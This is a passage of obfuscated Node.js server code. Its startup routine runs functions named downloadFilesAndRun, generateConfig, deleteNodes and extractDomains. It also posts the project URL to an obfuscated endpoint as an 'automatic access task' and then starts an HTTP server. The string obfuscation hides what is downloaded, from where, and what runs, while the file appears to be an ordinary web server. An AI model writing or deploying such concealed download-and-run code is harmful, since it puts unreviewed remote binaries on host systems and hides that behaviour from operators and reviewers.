axios[_0x13d7d7(0x19e)](_0x13d7d7(0x14d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x13d7d7(0x1ba)}});return console[_0x13d7d7(0x132)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2605d4;}catch(_0x934cac){return console['error'](_0x13d7d7(0x12e)+_0x934cac['message']),null;}}async function startserver(){const _0x129f7e=_0x4e5cd0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1fef98){console['error'](_0x129f7e(0x163),_0x1fef98);}}startserver()[_0x4e5cd0(0x1d2)](_0x5e109a=>{const _0x19497a=_0x4e5cd0;console['error'](_0x19497a(0x1c2),_0x5e109a);}),app[_0x4e5cd0(0x177)](PORT,()=>console[_0x4e5cd0(0x132)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
